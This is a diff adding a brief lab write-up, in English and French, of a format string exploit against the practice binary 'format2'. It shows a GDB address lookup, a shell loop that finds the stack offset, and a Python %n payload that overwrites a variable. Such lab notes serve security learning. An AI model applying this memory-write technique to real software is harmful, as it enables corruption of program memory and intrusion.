@@ -1,0 +1,16 @@
+similar to the previous problems, except that we should write a specific value to a specific address.
+
+D'abord, nous trouvons l'adresse de variable "target" avec outil GDB:
+   c'est 0x804a048
+
+Ensuite, nous trouvons la distance entre buffer et location actuelle:
+   for i in {1..10}; do echo "trying offset $i - $(echo DDDD%$i\$08x | ./format2)"; done | grep DDDD44444444
+           trying offset 4 - DDDD44444444
+   la distance est 4
+
+to modify target's value to 64, we construct following command:
+   python -c "print '\x48\xa0\x04\x08'+'%60x'+'%4\$n'"  | ./format2
+
+and finally we get the right result:
+   you have modified the target :)
+
